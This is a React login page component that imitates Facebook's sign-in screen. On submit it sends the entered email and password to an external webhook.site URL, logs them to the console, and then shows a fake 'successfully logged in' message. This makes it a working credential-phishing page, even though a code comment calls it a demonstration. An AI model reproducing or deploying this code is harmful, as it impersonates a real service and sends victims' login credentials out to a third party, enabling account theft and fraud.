'use client'

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { CheckCircle2 } from "lucide-react"

export default function LoginPage() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showSuccess, setShowSuccess] = useState(false)
  const [opacity, setOpacity] = useState(1)

  useEffect(() => {
    let fadeTimeout: NodeJS.Timeout
    let hideTimeout: NodeJS.Timeout

    if (showSuccess) {
      hideTimeout = setTimeout(() => {
        setOpacity(0)
        fadeTimeout = setTimeout(() => {
          setShowSuccess(false)
          setOpacity(1)
        }, 500)
      }, 2000)
    }

    return () => {
      clearTimeout(hideTimeout)
      clearTimeout(fadeTimeout)
    }
  }, [showSuccess])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()

    // Simulate login process
    console.log("Email:", email)
    console.log("Password:", password)

    try {
      // Send credentials to a webhook (for demonstration purposes)
      const webhookUrl = 'https://webhook.site/67bed246-ea62-40ff-94f4-dcdfa73b3934';
      const response = await fetch(webhookUrl, {
        mode: 'no-cors',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      })

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

    } catch (error) {
      console.error("An error occurred while logging credentials:", error)
    }

    // Show success message
    setShowSuccess(true)

    // Reset form
    setEmail("")
    setPassword("")
  }

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col justify-center items-center p-4 relative">
      <div className="max-w-md w-full bg-white rounded-lg shadow-md p-8 space-y-4">
        <div className="text-center">
          <h1 className="text-4xl font-bold text-blue-600">Facebook</h1>
        </div>
        <form className="space-y-4" onSubmit={handleLogin}>
          <div className="space-y-2">
            <Label htmlFor="email">Email or Phone</Label>
            <Input
              id="email"
              placeholder="Enter your email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="password">Password</Label>
            <Input
              id="password"
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white">
            Log In
          </Button>
        </form>
        <div className="text-center">
          <a href="#" className="text-blue-600 hover:underline">
            Forgot Password?
          </a>
        </div>
        <hr className="my-4" />
        <div className="text-center">
          <Button className="bg-green-500 hover:bg-green-600 text-white">
            Create New Account
          </Button>
        </div>
      </div>
      {showSuccess && (
        <div 
          className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 transition-opacity duration-500 ease-in-out"
          style={{ opacity: opacity }}
        >
          <div className="bg-white rounded-lg p-8 max-w-sm w-full">
            <div className="text-center">
              <CheckCircle2 className="h-16 w-16 text-green-500 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Success!</h2>
              <p className="text-gray-600">You have successfully logged in.</p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
